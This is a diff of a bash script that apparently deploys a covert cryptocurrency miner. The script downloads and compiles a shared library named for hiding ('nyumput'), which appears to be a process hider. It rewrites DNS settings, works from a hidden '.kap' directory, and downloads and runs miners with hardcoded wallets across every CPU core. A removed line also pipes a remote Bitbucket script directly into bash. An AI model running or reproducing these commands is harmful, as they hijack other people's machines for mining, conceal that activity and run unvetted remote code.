@@ -1,5 +1,6 @@
 #!/bin/bash
 apt-get update ; apt-get install sudo -y
+apt install unzip
 curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
@@ -9,7 +10,8 @@ rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 mkdir .kap && cd .kap
-wget -O sgr1 https://github.com/kartolo92/pile/raw/main/avx2adv
-chmod +x sgr1
-sudo ./sgr1 -a power2b -o stratum+tcp://167.99.139.112:443 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-kir -t $(nproc --all)
-curl -sL https://bitbucket.org/veha99/esceveha/raw/main/boled04.sh | bash 
+wget https://github.com/egg5233/ore-hq-client/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip
+cd OrionClient_linux
+chmod +x OrionClient
+./OrionClient mine -a --pool twbitz --key 76dvS6JKn3WmKQXm4Rx3LBQZHpagXmiqE67gu7CCB55h --worker $(shuf -n 1 -i 1-99999)-cok -t $(nproc --all) --ice
+
